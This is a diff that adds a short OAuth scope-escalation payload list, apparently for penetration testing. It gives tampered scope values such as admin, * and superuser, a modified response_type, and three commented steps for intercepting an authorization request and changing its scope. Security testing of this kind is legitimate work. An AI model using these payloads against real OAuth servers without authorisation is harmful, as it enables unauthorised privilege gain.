@@ -1,0 +1,18 @@
+# Scope escalation
+scope=admin
+scope=admin:*
+scope=*
+scope=openid+admin
+scope=openid+profile+email+admin
+scope=read write admin
+scope=user:admin
+scope=account:full_access
+scope=user.info+user.admin
+scope=all
+scope=superuser
+scope=super_admin
+response_type=token%20id_token
+# Try modifying scope mid-flow:
+# 1. Intercept authorization request
+# 2. Change scope=openid to scope=openid+admin
+# 3. If server doesn't validate against client registration → scope escalation
